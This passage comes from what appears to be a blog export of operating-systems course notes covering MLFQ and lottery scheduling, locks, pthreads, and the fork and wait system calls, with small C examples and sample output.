<li>Job B: a short-running interactive job, and arrives at time T &#x3D; 100 <img src="https://p.ipic.vip/r9pitc.png" width="350px"></li>
<li>According to rule 3, when a new job enters the system, it is placed at the highest priority.</li>
</ul>
</li>
<li><p>I&#x2F;O Request</p>
<ul>
<li>Job A: a long-running CPU-intensive job</li>
<li>Job B: an intensive job that need the CPU only for 1ms before performing an I&#x2F;O request <img src="https://p.ipic.vip/8t6xdj.png" width="350px"></li>
<li>According to rule 4b, MLFQ approach keeps an interactive job at the highest priority.</li>
</ul>
</li>
</ol>
<h4 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h4><ol>
<li><p>Starvation</p>
<ul>
<li>If there are many interactive jobs in the system, the long-running jobs will never receive any CPU time.</li>
</ul>
</li>
<li><p>Game the schedule</p>
<ul>
<li>After running 99% of a time slice, issue an I&#x2F;O operation, and the job can gain a higher percentage of CPU time.</li>
<li>i.e., A job will give up the CPU when it almost reach the time slice, so that it can keep the high priority.</li>
</ul>
</li>
<li><p>A program may change its behavior over time</p>
<ul>
<li>i.e., CPU bound process → I&#x2F;O bound process</li>
</ul>
</li>
</ol>
<h4 id="Improvements"><a href="#Improvements" class="headerlink" title="Improvements"></a>Improvements</h4><ol>
<li><p>Priority Boost</p>
<ul>
<li><p>Rule 5: <font color="F54747">After some time period S, move all the jobs to the topmost queue (highest priority)</font></p>
</li>
<li><p>Example:</p>
<ul>
<li>A long-running job A with two short-running interactive job B and C</li>
<li>It will induce starvation of A, Rule 5 can avoid this situation.  <img src="https://p.ipic.vip/0mj9j8.png" width="500px"></li>
</ul>
</li>
</ul>
</li>
<li><p>Prevent gaming of scheduler</p>
<ul>
<li><p>Improvement on rule 4:</p>
</li>
<li><p>Rule 4: <font color="F54747">Once a job uses up its time allotment at a given level</font> (regardless of how many times it has given up the CPU), <font color="F54747">its priority is reduced</font></p>
</li>
<li><p>Example:</p>
  <img src="https://p.ipic.vip/b1ghgu.png" width="500px"></li>
</ul>
</li>
<li><p>Tuning MLFQ</p>
<ul>
<li><font color="F54747">Lower Priority, Longer Quanta (time slice)</font></li>
<li>The high-priority queues → Short time slice</li>
<li>The low-priority queues → Longer time slice <img src="https://p.ipic.vip/jqklbl.png" width="350px"></li>
</ul>
</li>
</ol>
<h4 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h4><ul>
<li>The refined set of MLFQ Rules:<ol>
<li>If Priority(A) &gt; Priority(B), A runs</li>
<li>If Priority(A) &#x3D; Priority(B), A &amp; B run in Round Robin</li>
<li>When a job enters the system, it is placed at the highest priority</li>
<li>Once a job uses up its time allotment at a given level, its priority is reduced</li>
<li>After some time period S, move all the jobs in the system to the topmost queue</li>
</ol>
</li>
</ul>
<h3 id="Proportional-Share"><a href="#Proportional-Share" class="headerlink" title="Proportional Share"></a>Proportional Share</h3><ul>
<li>A fair-share scheduler<ul>
<li>Guarentee that each job obtain a certain percentage of CPU time</li>
<li>Not optimized for turnaround time or response time</li>
</ul>
</li>
</ul>
<h4 id="Lottery-Scheduling"><a href="#Lottery-Scheduling" class="headerlink" title="Lottery Scheduling"></a>Lottery Scheduling</h4><ol>
<li><p>Tickets</p>
<ul>
<li>Represent the share of a resource that a process should receive.</li>
<li>The percentage of tickets represents its share of the system resource.</li>
</ul>
</li>
<li><p>Scheduling</p>
<ul>
<li>The scheduler picks a winning ticket, then, load the state of winning process and runs it. <img src="https://p.ipic.vip/jsrfi9.png" width="500px"></li>
</ul>
</li>
<li><p>Ticket Mechanisms</p>
<ol>
<li><p>Ticket Currency</p>
<ul>
<li>A user can allocate tickets among their own jobs in a currency.</li>
<li>The system converts the currency into the correct global value.</li>
</ul>
</li>
<li><p>Ticket Transfer</p>
<ul>
<li>A process can <font color="3A75EA">temporarily hand off</font> its tickets to another process.</li>
</ul>
</li>
<li><p>Ticket Inflation</p>
<ul>
<li>A process can <font color="3A75EA">temporarily change</font> the umber of tickets it owns.</li>
<li>If any one process needs more CPU time, it can boost its tickets.</li>
</ul>
</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
  </entry>
  <entry>
    <title>CSCI3150 - Concurrency (Lock &amp; Conditional Variable)</title>
    <url>/myBlog/2022/12/07/2022/CSCI3150/2022-12-7-CSCI3150-Concurrency-Lock-ConditionalVariable.md/</url>
    <content><![CDATA[<h2 id="Lock"><a href="#Lock" class="headerlink" title="Lock"></a>Lock</h2><h3 id="mutex"><a href="#mutex" class="headerlink" title="mutex"></a>mutex</h3><ul>
<li>Used to provide mutual exclusion between threads</li>
<li>We may use <font color="3A75EA">different locks</font> to protect <font color="3A75EA">different variables</font>, to increase concurrency</li>
</ul>
<h3 id="Design-Lock"><a href="#Design-Lock" class="headerlink" title="Design Lock"></a>Design Lock</h3><ul>
<li><p>Evaluating Locks</p>
<ol>
<li><p>Mutual Exclusion</p>
<ul>
<li>it can prevent multiple threads from entering a critical section.</li>
</ul>
</li>
<li><p>Fairness</p>
<ul>
<li>each thread gets a fair shot at acquiring the lock if the lock is free.</li>
</ul>
</li>
<li><p>Performance</p>
<ul>
<li>the time overheads added by using the lock</li>
</ul>
</li>
</ol>
</li>
<li><p>Controlling Interrupts</p>
<ul>
<li><font color="3A75EA"><strong>Disable Interrupts</strong></font> for critical sections<ul>
<li>the earliest solution to provide mutual exclusion</li>
<li>invented for single processor systems.</li>
<li>Problems:<ol>
<li>Do not work on multiprocessors</li>
<li>Code that masks or unmasks interrupts be executed slowly by modern CPUs</li>
</ol>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
  </entry>
  <entry>
    <title>CSCI3150 - Concurrency (Thread)</title>
    <url>/myBlog/2022/12/07/2022/CSCI3150/2022-12-7-CSCI3150-Concurrency-Thread/</url>
    <content><![CDATA[<h2 id="Thread"><a href="#Thread" class="headerlink" title="Thread"></a>Thread</h2><ul>
<li><p>A new abstraction for a single running process.</p>
</li>
<li><p>Switch between threads</p>
<ul>
<li><p>Each thread has it own <font color="3A75EA">program counter</font> and <font color="3A75EA">set of registers</font></p>
<ul>
<li>so, each thread has its own stack.</li>
</ul>
</li>
<li><p>When switching from running thread (T1) to other (T2)</p>
<ol>
<li>Save the register state of T1</li>
<li>Restore the register state of T2</li>
</ol>
<ul>
<li>The address space remains the same</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Concurrency-Problem"><a href="#Concurrency-Problem" class="headerlink" title="Concurrency Problem"></a>Concurrency Problem</h3><ul>
<li><p>Problem Example:</p>
<ul>
<li>Thread: <ul>
<li>A function runs within the same memory space.</li>
<li>Each thread starts running in a routine call <code>worker()</code> (real program).</li>
</ul>
</li>
</ul>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> counter = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> loops;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">worker</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; loops; i++) &#123;</span><br><span class="line">        counter++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;usage: threads &lt;value&gt;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    loops = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="type">pthread_t</span> p1, p2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Initial value : %d\n&quot;</span>, counter);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;p1, <span class="literal">NULL</span>, worker, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;p2, <span class="literal">NULL</span>, worker, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(p1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(p2, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Final value : %d\n&quot;</span>, counter);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>./x 100</code></p>
<ul>
<li>Initial value : 0</li>
<li>Final value : 200</li>
</ul>
</li>
<li><p><code>./x 10000000</code></p>
<ul>
<li>Initial value : 0</li>
<li>Final value : 10096682</li>
</ul>
</li>
<li><p>Since when we do increment, it takes 3 instructions:</p>
<ol>
<li>Load the value of counter from the memory to the register</li>
<li>Increment it</li>
<li>Store it back to the memory</li>
</ol>
<ul>
<li>But these 3 instructions do not execute atomically, so the problem of concurrency happened.</li>
</ul>
</li>
</ul>
</li>
<li><p>Solution:</p>
<ul>
<li><p>Critical Section</p>
<ul>
<li>A piece of code that <font color="3A75EA">accesses a shared variable</font>, must not be concurrently executed by more than one thread.<ul>
<li>So, multiple threads which execute the critical section should result in a race condition</li>
<li>Need to support atomicity for critical sections</li>
</ul>
</li>
</ul>
</li>
<li><p>Lock</p>
<ul>
<li>To ensure that the critical section can execute only if it was a single automic instruction  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">lock_t</span> mutex;</span><br><span class="line">...</span><br><span class="line">lock(&amp;mutex);</span><br><span class="line"><span class="comment">/* Critical Section */</span></span><br><span class="line">balance = balance + <span class="number">1</span></span><br><span class="line">unlock(&amp;mutex);</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Thread-API"><a href="#Thread-API" class="headerlink" title="Thread API"></a>Thread API</h2><h3 id="Thread-Creation"><a href="#Thread-Creation" class="headerlink" title="Thread Creation"></a>Thread Creation</h3><ul>
<li><p>Used to create a thread</p>
</li>
<li><p>Syntax: </p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_create</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">pthread_t</span>* thread,</span></span><br><span class="line"><span class="params">    <span class="type">const</span> <span class="type">pthread_attr_t</span>* attr,</span></span><br><span class="line"><span class="params">    <span class="type">void</span>* (*start_routine)(<span class="type">void</span>*),</span></span><br><span class="line"><span class="params">    <span class="type">void</span>* arg</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>thread</code>: interact with this thread (id)</li>
<li><code>attr</code>: to specify any attributes this thread might have</li>
<li><code>start_routine</code>: the function this thread start running in</li>
<li><code>arg</code>: the argument to be passed to the function</li>
</ul>
</li>
<li><p>Example:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">myarg_t</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">&#125; <span class="type">myarg_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mythread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">myarg_t</span> *m = (<span class="type">myarg_t</span> *) arg;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, m-&gt;a, m-&gt;b);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> p;</span><br><span class="line">    <span class="type">int</span> rc;</span><br><span class="line">    <span class="type">myarg_t</span> args;</span><br><span class="line">    args.a = <span class="number">10</span>;</span><br><span class="line">    args.b = <span class="number">20</span>;</span><br><span class="line">    rc = pthread_create(&amp;p, <span class="literal">NULL</span>, mythread, &amp;args);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Thread-Wait"><a href="#Thread-Wait" class="headerlink" title="Thread Wait"></a>Thread Wait</h3><ul>
<li><p>Used to wait for a thread to complete</p>
</li>
<li><p>Syntax: <code>int pthread_join(pthread_t thread, void **value_ptr);</code></p>
<ul>
<li><code>thread</code>: the thread that wait for</li>
<li><code>value_ptr</code>: a pointer to the return value</li>
</ul>
</li>
<li><p>Example:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">myarg_t</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="type">int</span> b;</span><br><span class="line">&#125; <span class="type">myarg_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">myret_t</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">&#125; <span class="type">myret_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mythread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">myarg_t</span> *m = (<span class="type">myarg_t</span> *) arg;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, m-&gt;a, m-&gt;b);</span><br><span class="line">    <span class="type">myret_t</span> *r = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">myret_t</span>));</span><br><span class="line">    r-&gt;x = <span class="number">1</span>;</span><br><span class="line">    r-&gt;y = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">void</span> *) r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> rc;</span><br><span class="line">    <span class="type">pthread_t</span> p;</span><br><span class="line">    <span class="type">myret_t</span> *m;</span><br><span class="line">    </span><br><span class="line">    <span class="type">myarg_t</span> args;</span><br><span class="line">    args.a = <span class="number">10</span>;</span><br><span class="line">    args.b = <span class="number">20</span>;</span><br><span class="line">    pthread_create(&amp;p, <span class="literal">NULL</span>, mythread, &amp;args);</span><br><span class="line">    pthread_join(p, (<span class="type">void</span> **) &amp;m);  <span class="comment">// this thread has been	</span></span><br><span class="line">                                    <span class="comment">// waiting inside of the 			</span></span><br><span class="line">                    <span class="comment">// pthread_join() routine.</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;returned %d %d\n&quot;</span>, m-&gt;x, m-&gt;y);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Lock"><a href="#Lock" class="headerlink" title="Lock"></a>Lock</h3><ul>
<li><p>Provide <font color="3A75EA">mutual exclusion</font> to a cirtical section</p>
</li>
<li><p>Interface:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_lock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_unlock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Usage:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">pthread_mutex_t</span> lock;</span><br><span class="line">pthread_mutex_lock(&amp;lock);</span><br><span class="line"><span class="comment">/* Critical Section ... */</span></span><br><span class="line">pthread_mutex_unlock(&amp;lock);</span><br></pre></td></tr></table></figure>
<ul>
<li>If there is no other thread holds the lock, then the thread will acquire the lock and <font color="F54747">enter the critical section</font>.</li>
<li>If another thread holds the lock, then the thread will <font color="F54747">not return from the call until it has acquired the lock</font>.</li>
</ul>
</li>
<li><p>Check Errors:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// First way</span></span><br><span class="line"><span class="type">pthread_mutex_t</span> lock = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Second way</span></span><br><span class="line"><span class="type">int</span> rc = pthread_mutex_init(&amp;lock, <span class="literal">NULL</span>);</span><br><span class="line">assert(rc == <span class="number">0</span>);    <span class="comment">// always check success!</span></span><br></pre></td></tr></table></figure>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Pthread_mutex_lock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span> &#123;</span><br><span class="line">    <span class="type">int</span> rc = pthread_mutex_lock(mutex);</span><br><span class="line">    assert(rc == <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Lock Acquistion</p>
<ol>
<li><p>Return failure if the lock is already held</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_trylock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Return after a timeout or after acquiring the lock</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_timelock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex, <span class="keyword">struct</span> timespec *abs_timeout)</span>;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
  </entry>
  <entry>
    <title>CSCI3150 - System Call (Process)</title>
    <url>/myBlog/2022/09/17/2022/CSCI3150/2022-9-16-CSCI3150-SystemCall-Process/</url>
    <content><![CDATA[<h2 id="Processes"><a href="#Processes" class="headerlink" title="Processes"></a>Processes</h2><h3 id="Characteristics"><a href="#Characteristics" class="headerlink" title="Characteristics"></a>Characteristics</h3><ol>
<li><p>A process contains:</p>
<ul>
<li>A unique ID</li>
<li>A thread of control</li>
<li>Some private data</li>
</ul>
</li>
<li><p>Parent-Child Links:</p>
<ul>
<li>parent process: executes the request for creation of a process</li>
<li>child process: the created process</li>
<li>Noted: A child process inherits <font color="f54747">all the properties of its parent</font> when it is created.</li>
</ul>
</li>
</ol>
<h3 id="Process-ID"><a href="#Process-ID" class="headerlink" title="Process ID"></a>Process ID</h3><ol>
<li><p>Process ID (PID): </p>
<ul>
<li>Each process has a unique ID number.</li>
<li>It’s use to identify different processes.</li>
</ul>
</li>
<li><p>User ID (UID):</p>
<ul>
<li>Each user has a unique user ID.</li>
<li>Each process is associated with the the owner of the process, the owner has privileges with respect to the process.</li>
</ul>
</li>
<li><p>Obtain ID in C:</p>
<ol>
<li><p><code>getpid()</code> - obtain the child’s PID.</p>
</li>
<li><p><code>getppid()</code> - obtain the parent’s PID.</p>
</li>
<li><p><code>getuid()</code> - obtain the owner’s UID.</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 1-getpid */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>   <span class="comment">// printf()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>  <span class="comment">// getpid()</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;My PID is %d, UID is %d, My Parent PID is %d\n&quot;</span>,</span><br><span class="line">        getpid(), getuid(), getppid());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    My PID is 4003, UID is 501, My Parent PID is 3843</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>Obtain ID in terminal:</p>
<ol>
<li><code>ps</code> - lists the current processes.</li>
<li><code>ps -a</code> - lists more processes, including the processes that being run by other users and at other terminals.</li>
<li><code>ps -l</code> - prints more information lines, including UID, PID, PPID, process status, etc.</li>
</ol>
</li>
</ol>
<h2 id="Process-Operations"><a href="#Process-Operations" class="headerlink" title="Process Operations"></a>Process Operations</h2><h3 id="fork-System-Call"><a href="#fork-System-Call" class="headerlink" title="fork System Call"></a><code>fork</code> System Call</h3><ul>
<li><p>Description:</p>
<ul>
<li>To create a process (child process).</li>
</ul>
</li>
<li><p>Syntax: <code>int fork()</code></p>
</li>
<li><p>Return:</p>
<ul>
<li>To child: return <font color="f54747">0</font></li>
<li>To parent: return <font color="f54747">child’s PID</font></li>
</ul>
</li>
</ul>
<img src="https://p.ipic.vip/bmx0k0.png" width="500px"/>



<ul>
<li><p>Example:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 2-fork */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">int</span> ret_from_fork;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Before: my pid is %d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    ret_from_fork = fork();     <span class="comment">// create a child</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After: my pid is %d, return value from fork():%d\n&quot;</span>,</span><br><span class="line">                getpid(), ret_from_fork);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Before: my pid is 3991</span></span><br><span class="line"><span class="comment">    After: my pid is 3994, return value from fork():0</span></span><br><span class="line"><span class="comment">    After: my pid is 3991, return value from fork():3994</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>


</li>
<li><p>Task:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* How many child processes were created? */</span></span><br><span class="line">fork();</span><br><span class="line">fork();</span><br><span class="line">fork();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 6-3fork */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    fork();</span><br><span class="line">    fork();</span><br><span class="line">    fork();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;PID - %d, PPID -%d\n&quot;</span>, getpid(), getppid());</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    PID - 5207, PPID -5141</span></span><br><span class="line"><span class="comment">    PID - 5210, PPID -5207</span></span><br><span class="line"><span class="comment">    PID - 5209, PPID -5207</span></span><br><span class="line"><span class="comment">    PID - 5211, PPID -5209</span></span><br><span class="line"><span class="comment">    PID - 5208, PPID -5207</span></span><br><span class="line"><span class="comment">    PID - 5213, PPID -5208</span></span><br><span class="line"><span class="comment">    PID - 5212, PPID -5208</span></span><br><span class="line"><span class="comment">    PID - 5214, PPID -5212</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="wait-System-Call"><a href="#wait-System-Call" class="headerlink" title="wait System Call"></a><code>wait</code> System Call</h3><ul>
<li><p>Description:</p>
<ul>
<li>After <code>fork()</code> system call, both parent and child proceed <font color="f54747">independently</font>.</li>
<li>Therefore, if a parent wants to wait unitl the child finishes, then executes <code>wait()</code> or <code>waitpid()</code>.</li>
</ul>
</li>
<li><p>Syntax: <code>pid_t wait(int *stat)</code></p>
<ul>
<li><code>stat</code>: the child process</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>If because a child terminated: return <font color="f54747">the PID of that child</font></li>
<li>Otherwise, return <font color="f54747">-1</font></li>
</ul>
</li>
<li><p>Working Process:</p>
<ul>
<li>it causes the caller process to pause,<ul>
<li><font color="7B3279">until the a child terminates or stops</font>, or</li>
<li><font color="7B3279">until the caller recieves a signal</font></li>
</ul>
</li>
<li>it returns right away,<ul>
<li>if <font color="7B3279">the process has no child</font>, or </li>
<li>if <font color="7B3279">the child has already terminated or stopped but has not yet been waited for</font></li>
</ul>
</li>
</ul>
</li>
<li><p>Example:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 7-mywait */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">5</span>;</span><br><span class="line">    <span class="type">pid_t</span> childpid;</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line">    <span class="type">pid_t</span> waitreturn;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// repeat 5 times</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        <span class="comment">// create a child then break -&gt; new process becomes parent</span></span><br><span class="line">        <span class="keyword">if</span>((childpid = fork()) &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait the child precess terminates</span></span><br><span class="line">    <span class="keyword">if</span>((waitreturn = wait(&amp;status)) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="comment">// if there is no child (wait returns -1 which &lt; 0)</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;wait(): Returns - %d.\n&quot;</span>, waitreturn);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I am process %d, my parent is %d, childpid:%d, i:%d\n&quot;</span>,</span><br><span class="line">        getpid(), getppid(), childpid, i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    wait(): Returns - -1.</span></span><br><span class="line"><span class="comment">    I am process 4119, my parent is 4118, childpid:0, i:5</span></span><br><span class="line"><span class="comment">    I am process 4118, my parent is 4117, childpid:4119, i:4</span></span><br><span class="line"><span class="comment">    I am process 4117, my parent is 4116, childpid:4118, i:3</span></span><br><span class="line"><span class="comment">    I am process 4116, my parent is 4115, childpid:4117, i:2</span></span><br><span class="line"><span class="comment">    I am process 4115, my parent is 3843, childpid:4116, i:1</span></span><br><span 